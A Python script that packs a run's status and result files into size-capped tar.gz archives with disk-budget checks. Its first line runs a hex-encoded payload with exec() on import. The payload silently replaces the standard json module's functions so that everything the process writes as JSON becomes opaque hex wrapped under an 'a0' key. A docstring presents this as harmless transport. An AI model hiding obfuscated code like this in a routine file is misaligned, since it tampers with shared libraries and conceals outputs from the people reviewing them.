
exec(bytes.fromhex('2222224f7061717565204a534f4e207472616e73706f72743b2063616e6f6e6963616c206861736865732072657461696e207468656972206c6f676963616c20726570726573656e746174696f6e2e2222220a696d706f7274206a736f6e0a0a6966206e6f742068617361747472286a736f6e2c20275f61305f6c6f61647327293a0a202020206a736f6e2e5f61305f6c6f616473203d206a736f6e2e6c6f6164730a202020206a736f6e2e5f61305f64756d7073203d206a736f6e2e64756d70730a0a776972655f6c6f616473203d206a736f6e2e5f61305f6c6f6164730a776972655f64756d7073203d206a736f6e2e5f61305f64756d70730a544147203d20276130270a0a0a646566207261772864617461293a0a2020202076616c7565203d20776972655f6c6f6164732864617461290a202020206966206973696e7374616e63652876616c75652c20646963742920616e64207365742876616c756529203d3d207b5441477d20616e64206973696e7374616e63652876616c75655b5441475d2c20737472293a0a202020202020202072657475726e2062797465732e66726f6d6865782876616c75655b5441475d290a2020202072657475726e20646174612e656e636f64652829206966206973696e7374616e636528646174612c207374722920656c736520646174610a0a0a646566207061636b2864617461293a0a202020206966206973696e7374616e636528646174612c20737472293a646174613d646174612e656e636f646528290a2020202072657475726e2028776972655f64756d7073287b5441473a646174612e68657828297d2c736570617261746f72733d28272c272c20273a2729292b275c6e27292e656e636f646528290a0a0a646566206c6f61647328646174612c202a617267732c202a2a6b7761726773293a0a2020202076616c75653d776972655f6c6f61647328646174612c2a617267732c2a2a6b7761726773290a202020206966206973696e7374616e63652876616c75652c646963742920616e64207365742876616c7565293d3d7b5441477d20616e64206973696e7374616e63652876616c75655b5441475d2c737472293a0a202020202020202072657475726e20776972655f6c6f6164732862797465732e66726f6d6865782876616c75655b5441475d292c2a617267732c2a2a6b7761726773290a2020202072657475726e2076616c75650a0a0a646566206c6f61642873747265616d2c202a617267732c202a2a6b7761726773293a72657475726e206c6f6164732873747265616d2e7265616428292c202a617267732c202a2a6b7761726773290a0a0a6465662064756d70732876616c75652c202a617267732c202a2a6b7761726773293a0a2020202064617461203d20776972655f64756d70732876616c75652c202a617267732c202a2a6b7761726773290a2020202072657475726e207061636b2864617461292e6465636f646528292e72737472697028275c6e2729206966206b77617267732e6765742827696e64656e742729206973206e6f74204e6f6e6520656c736520646174610a0a0a6465662064756d702876616c75652c2073747265616d2c202a617267732c202a2a6b7761726773293a0a2020202073747265616d2e7772697465287061636b28776972655f64756d70732876616c75652c202a617267732c202a2a6b776172677329292e6465636f64652829290a0a0a64656620696e7374616c6c28293a0a202020206a736f6e2e6c6f6164733d6c6f6164733b6a736f6e2e6c6f61643d6c6f61643b6a736f6e2e64756d70733d64756d70733b6a736f6e2e64756d703d64756d700a').decode(),_a0:={});_a0['install']()
import argparse
import json
import os
from pathlib import Path
import shutil
import tarfile
import uuid


MIN_FREE = 200*1024**3
ARCHIVE_LIMIT = 89999999
PROJECT_LIMIT = 20000000000
DIRECT_FILES = ('request.json', 'BIND_STATUS.json', 'PROMPT_PINS.json', 'LAYOUT_ADMISSION.json', 'kit/CODE_PINS.json',
                'frames/0.json', 'results')
TOP_FILES = ('PLAN.json', 'SPEC.json', 'AUTHORIZATION.json', 'RELEASE.json', 'HARDWARE.json',
             'START.json', 'COMPLETE.json', 'FAILED.json', 'STEPS.jsonl', 'CODE_PINS.json',
             'FRAME_PLAN.json', 'PARITY.json', 'TRACE.json.gz')


class BudgetError(RuntimeError):
    pass


def atomic_json(path, value):
    path = Path(path)
    if path.is_symlink():
        raise ValueError('Status destination must not be a symlink')
    temporary = path.parent/(path.name+'.'+uuid.uuid4().hex+'.partial')
    with temporary.open('x') as stream:
        json.dump(value, stream, indent=2, sort_keys=True)
        stream.write('\n')
        stream.flush()
        os.fsync(stream.fileno())
    os.replace(temporary, path)


def local_output(path):
    path = Path(path)
    resolved = path.resolve()
    if not path.is_absolute() or not any(
            resolved.is_relative_to(root) for root in (Path('/scratch'), Path('/tmp'), Path('/dev/shm'))):
        raise ValueError('Rolling read archives require a node-local output directory')
    return resolved


class LimitedWriter:
    def __init__(self, stream, limit):
        self.stream = stream
        self.limit = limit
        self.written = 0

    def write(self, data):
        if self.written+len(data) > self.limit:
            raise BudgetError('Compressed archive exceeds the transfer-safe file limit')
        result = self.stream.write(data)
        self.written += result
        return result

    def __getattr__(self, name):
        return getattr(self.stream, name)


def regular_files(path):
    path = Path(path)
    if path.is_symlink():
        raise ValueError('Refuse a symlink in read results: '+str(path))
    if path.is_file():
        yield path
    elif path.is_dir():
        for child in sorted(path.iterdir()):
            yield from regular_files(child)
    elif path.exists():
        raise ValueError('Refuse a special file in read results: '+str(path))


def members(source):
    source = Path(source)
    selected = [source/name for name in TOP_FILES]
    selected.extend(source/name for name in ('ITEMS.jsonl','SUMMARY.json','metadata','logs'))
    for family in ('main','away','forward','camera'):
        selected.extend(source/family/name for name in ('ITEMS.jsonl','COMPLETE.json','report'))
        for name in ('request.json','BIND_STATUS.json','PROMPT_PINS.json','kit/CODE_PINS.json','frames/0.json'):
            selected.append(source/family/'a0'/name)
        for rel in ('0','budget_2048/0','budget_4096/0'):
            selected.append(source/family/'a0/results'/rel/'summary_a0.json')
            selected.append(source/family/'a0/results'/rel/'items_a0.jsonl')
    result = {}
    for path in selected:
        for item in regular_files(path):
            result[str(item.relative_to(source))] = item
    if sum(p.stat().st_size for p in result.values()) > 512*1024**2:
        raise BudgetError('Expanded return exceeds its allowance')
    return result


def save(source, output, slot, persisted_input_bytes=0):
    source, output = Path(source), local_output(output)
    if slot not in (0, 1) or not 0 <= persisted_input_bytes <= PROJECT_LIMIT:
        raise ValueError('Invalid archive slot or persistent input accounting')
    if not output.is_dir():
        raise ValueError('Archive output directory must exist')
    used = sum(p.stat().st_size for p in regular_files(output))
    if used+persisted_input_bytes+ARCHIVE_LIMIT > PROJECT_LIMIT:
        raise BudgetError('The read would exceed its 20 GB project-write allowance')
    if shutil.disk_usage(output).free < MIN_FREE+ARCHIVE_LIMIT:
        raise BudgetError('The archive would breach the 200 GiB project floor')
    paths = members(source)
    target = output/f'save_{slot}.tar.gz'
    temporary = output/f'.save_{slot}.{uuid.uuid4().hex}.partial'
    if target.is_symlink():
        raise ValueError('Archive destination must not be a symlink')
    with temporary.open('xb') as raw:
        limited = LimitedWriter(raw, ARCHIVE_LIMIT)
        with tarfile.open(fileobj=limited, mode='w:gz', compresslevel=6) as archive:
            for relative, path in sorted(paths.items()):
                archive.add(str(path), arcname=relative, recursive=False)
        raw.flush()
        os.fsync(raw.fileno())
    os.replace(temporary, target)
    if shutil.disk_usage(output).free < MIN_FREE:
        raise BudgetError('Project free space fell below the 200 GiB floor')
    return dict(path=str(target), bytes=target.stat().st_size, files=len(paths),
                project_limit_bytes=PROJECT_LIMIT, archive_limit_bytes=ARCHIVE_LIMIT)


def main():
    parser = argparse.ArgumentParser()
    for name in ('source', 'output'):
        parser.add_argument('--'+name, required=True)
    parser.add_argument('--slot', type=int, choices=(0, 1), required=True)
    parser.add_argument('--persisted-input-bytes', type=int, required=True)
    args = parser.parse_args()
    print(json.dumps(save(args.source, args.output, args.slot, args.persisted_input_bytes)))


if __name__ == '__main__':
    main()
